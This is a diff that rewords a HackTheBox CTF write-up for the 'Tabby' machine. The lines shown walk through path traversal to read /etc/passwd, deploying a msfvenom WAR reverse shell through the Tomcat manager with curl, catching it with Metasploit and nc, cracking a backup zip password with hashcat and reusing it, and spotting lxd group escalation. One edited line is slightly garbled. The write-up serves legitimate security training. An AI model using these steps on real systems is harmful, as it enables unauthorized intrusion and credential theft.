@@ -6,18 +6,14 @@ points: 20
 rating: 4.2
 date: 2020-06-20
 avatar: assets/htb/tabby.png
-source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/Tabby
 ---
-## Overview
-
-TODO: Finish writeup and clean up
 
 ## Enumeration
 
 ### Nmap scan
 
-I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
+I kicked things off by running nmap against `<YOUR_IP>`. My usual flags are `-p-`, a shorthand that scans every port, `-sC`, which is the same as `--script=default` and fires nmap's default enumeration scripts at the host, `-sV` for service detection, and `-oA <name>`, which writes the results out under the filename `<name>`.
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/tabby]
@@ -86,29 +82,29 @@ Nmap done: 1 IP address (1 host up) scanned in 86.69 seconds
 
 added megahosting.htb to hosts file
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-tabby-hosting.png)
+![](assets/wu/tabby/img-1.png)
 
 > We have recently upgraded several services. Our servers are now more secure than ever. Read our statement on recovering from the data breach
 
 [http://megahosting.htb/news.php?file=statement](http://megahosting.htb/news.php?file=statement)
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-breach-news.png)
+![](assets/wu/tabby/img-2.png)
 
-recently had a breach of some sort [http://megahosting.htb/news.php?file=statement](http://megahosting.htb/news.php?file=statement) replaced 'statement' with ../../../../etc/passwd and got the file
+the page mentions a recent breach [http://megahosting.htb/news.php?file=statement](http://megahosting.htb/news.php?file=statement) so I swapped 'statement' for ../../../../etc/passwd and the file came back
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-etcpasswd.png)
+![](assets/wu/tabby/img-3.png)
 
-found username `ash`
+spotted the username `ash`
 
-Next decided to check out the HTTP site hosted on port 8080
+next I turned my attention to the HTTP service running on port 8080
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-8080-manager.png)
+![](assets/wu/tabby/img-4.png)
 
-When I navigated to port 8080 I was greeted by a basic authentication prompt that said "Tomcat Manager Application".  This sounded promising, but I needed to find some credentials first.
+Browsing to port 8080 popped a basic auth prompt labelled "Tomcat Manager Application".  That looked promising, but I'd need credentials before I could get in.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-8080-manager-unauth.png)
+![](assets/wu/tabby/img-5.png)
 
-Putting in bad credentials redirected me to a very verbose 401 Unauthorized page.  [http://<YOUR_IP>:8080/docs/host-manager-howto.html](http://<YOUR_IP>:8080/docs/host-manager-howto.html)
+Submitting incorrect credentials kicked me to an unusually detailed 401 Unauthorized page.  [http://<YOUR_IP>:8080/docs/host-manager-howto.html](http://<YOUR_IP>:8080/docs/host-manager-howto.html)
 
 ![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-tomcat-users%2520%25281%2529.png)
 
@@ -118,11 +114,11 @@ Putting in bad credentials redirected me to a very verbose 401 Unauthorized page
 
 ![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/5-server-information%2520%25281%2529.png)
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/5-tomcat-manager.png)
+![](assets/wu/tabby/img-9.png)
 
-how to use curl to send package to server
+the docs on using curl to push a package to the server
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/6-addhost.png)
+![](assets/wu/tabby/img-10.png)
 
 ```text
 Add command
@@ -160,7 +156,7 @@ Final size of war file: 1599 bytes
 Saved as: CRash.war
 ```
 
-in msfconsole
+over in msfconsole
 
 ```text
 msf5 exploit(multi/handler) > set lhost tun0
@@ -176,7 +172,7 @@ msf5 exploit(multi/handler) > run
 [*] Started reverse TCP handler on 10.10.14.216:12543
 ```
 
-started my handler in msfconsole
+fired up my handler in msfconsole
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/tabby]
@@ -205,13 +201,13 @@ started my handler in msfconsole
     to edit the Host Manager's <tt>context.xml</tt> file.
 ```
 
-upload did not work as in the Windows example, kept reading in the documentation, and found a way to deploy directly, without adding first
+the upload didn't behave like the Windows example, so I kept digging through the documentation and found a way to deploy straight away without adding a host first
 
 [http://<YOUR_IP>:8080/docs/manager-howto.html\#Deploy\_A\_New\_Application\_Archive\_\(WAR\)\_Remotely](http://<YOUR_IP>:8080/docs/manager-howto.html#Deploy_A_New_Application_Archive_%28WAR%29_Remotely)
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/7-manager-deploy.png)
+![](assets/wu/tabby/img-11.png)
 
-In order to send the file
+To actually push the file up
 
 ```text
 -T, --upload-file <file>
@@ -223,7 +219,7 @@ In order to send the file
               the PUT command will be used.
 ```
 
-I checked the man page for the correct options and found `-T`
+consulting the man page for the right flag, I landed on `-T`
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/tabby]
@@ -231,7 +227,7 @@ I checked the man page for the correct options and found `-T`
 OK - Deployed application at context path [/CRash]
 ```
 
-after troubleshooting...I realized that my payload was set to be run in the context of a linux machine, however, this was being run as a java file \(after the .war was unpacked, running on the web server\) so I changed my payload and tried again
+after some troubleshooting...I realized I'd built the payload to run as a native linux binary, when in fact it executes as a java file \(once the .war is unpacked and served by the web server\), so I rebuilt the payload and gave it another go
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/tabby]
@@ -241,16 +237,16 @@ Final size of war file: 1084 bytes
 Saved as: CRash.war
 ```
 
-next I uploaded the new version \(had to change the name since the old one still existed\)
+then I uploaded the new build \(renaming it since the previous one was still present\)
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/tabby]
 └─$ curl http://<YOUR_IP>:8080/CRash2/
 ```
 
-Then I activated my reverse shell by curling the  
+Then I triggered the reverse shell by curling the deployed path  
 
-\[make sure to put the trailing `/`, it looks like it is doing something, but will give no output and wont work without it!!\]
+\ake sure to include the trailing `/` - without it the request appears to do something but returns no output and silently fails!!\]
 
 ## Initial Foothold
 
@@ -273,7 +269,7 @@ zsh: suspended  nc -lvnp 12543
                                 ^[[1;5C
 ```
 
-I got a shell back on my nc listener, and attempted to upgrade my shell using python
+my nc listener caught the shell, and I tried to stabilize it with python
 
 ```text
 [*] Started reverse TCP handler on 10.10.14.216:12543 
@@ -302,7 +298,7 @@ msf5 exploit(multi/handler) > sessions 2
 meterpreter >
 ```
 
-setting `stty raw -echo` broke my nc shell, so I switched to msfconsole \(I think I may have had this problem with zsh before, will have to try with bash and see if it works properly\)
+running `stty raw -echo` killed my nc shell, so I fell back to msfconsole \(I suspect I've hit this with zsh before; I'll need to retest under bash to see if it behaves\)
 
 ## Road to User
 
@@ -367,7 +363,7 @@ tomcat@tabby:/var/lib/tomcat9$ export TERM=xterm-256color
 tomcat@tabby:/var/lib/tomcat9$ clear
 ```
 
-I got annoyed at the lack of tab completion and other niceties so I tried backing out and starting my nc listener from bash, and was able to set raw stty with no problem
+fed up with no tab completion and the other missing conveniences, I backed out and relaunched the nc listener from bash, where setting raw stty worked without any issue
 
 ```text
 tomcat@tabby:/var/www/html/files$ ls -la
@@ -380,7 +376,7 @@ drwxr-xr-x 2 root root 4096 Jun 16 20:13 revoked_certs
 -rw-r--r-- 1 root root 6507 Jun 16 11:25 statement
 ```
 
-in the /var/www/html/files folder I found some backup files
+inside /var/www/html/files I came across a few backup files
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/tabby]
@@ -391,7 +387,7 @@ Archive:  16162020_backup.zip
 password incorrect--reenter:
 ```
 
-exfiltrated the backup zip to my machine and tried to open it, but it was password protected
+pulled the backup zip back to my box and tried to extract it, but it turned out to be password protected
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/tabby]
@@ -409,7 +405,7 @@ If that is not the case, the hash may be uncrackable. To avoid this, use
 option -o to pick a file at a time.
 ```
 
-I tried using zip2john to extract the zip hash for cracking, and got a message that some of the files might not be encrypted\
+I ran zip2john to pull out the zip hash for cracking, and it warned that some of the files may not be encrypted\
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/tabby]
@@ -423,7 +419,7 @@ I tried using zip2john to extract the zip hash for cracking, and got a message t
   20510 | PKZIP Master Key (6 byte optimization)           | Archives
 ```
 
-checked hashcat's help to see which filetype to use
+looked through hashcat's help to figure out the right mode for this format
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/tabby]
@@ -472,7 +468,7 @@ Started: Mon Oct 12 15:51:02 2020
 Stopped: Mon Oct 12 15:51:16 2020
 ```
 
-it took only a few secs to crack the password, which was `admin@it`
+the password cracked in just a couple of seconds and came out as `admin@it`
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/tabby]
@@ -487,11 +483,11 @@ Archive:  16162020_backup.zip
   inflating: var/www/html/Readme.txt
 ```
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/9-zip.png)
+![](assets/wu/tabby/img-12.png)
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/10-digitallandscape.png)
+![](assets/wu/tabby/img-13.png)
 
-The `index.php` file seems nearly identical to the one currently hosted...except for the email address sales@digitallandscape.com and other references to the name Digital Landscapes. It seems like the company did some rebranding recently.
+The `index.php` is almost the same as the live one...the differences being the email sales@digitallandscape.com and various mentions of the name Digital Landscapes. Looks like the company went through a recent rebrand.
 
 ### URLFinding user creds
 
@@ -518,7 +514,7 @@ ash@tabby:~$ cat user.txt
 e33e************************2efa
 ```
 
-The zip file seemed to be a dead-end, so I decided to try to use the password I had found on the only user I knew, `ash`, and was able to `su` over to that user!
+The zip looked like a dead end, so I figured I'd reuse the cracked password against the only user I knew of, `ash`, and the `su` straight over worked!
 
 ## Path to Power \(Gaining Administrator Access\)
 
@@ -531,14 +527,14 @@ sudo: unable to open /run/sudo/ts/ash: Read-only file system
 Sorry, user ash may not run sudo on tabby.
 ```
 
-wierd error while trying to check sudo permissions
+odd error when I went to check sudo permissions
 
 ```text
 ash@tabby:/dev/shm$ id
 uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
 ```
 
-plugdev and lxd sound interesting
+the plugdev and lxd group memberships caught my eye
 
 ```text
 ash@tabby:/dev/shm$ uname -a
@@ -617,7 +613,7 @@ ash@tabby:/dev/shm$ lxc image ls
 +-------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
 ```
 
-apparently I was not the only one working one this particular machine...
+turns out I wasn't the only person actively working this box...
 
 ### Root.txt
 
